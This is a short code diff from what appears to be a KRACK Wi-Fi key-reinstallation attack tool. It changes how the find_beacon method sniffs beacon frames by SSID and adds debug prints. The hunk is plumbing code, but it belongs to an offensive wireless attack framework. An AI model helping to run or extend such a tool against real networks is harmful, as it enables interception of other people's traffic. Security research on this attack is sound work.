@@ -505,7 +505,7 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		ps = sniff(count=1, timeout=0.5, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # opened_socket=self.sock_real iface=self.nic_real
+		ps = sniff(count=1, timeout=0.5, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # opened_socket=self.sock_real iface=self.nic_real
 		print('505: ', end='')
 		print(ps)
 		if ps is None or len(ps) < 1:
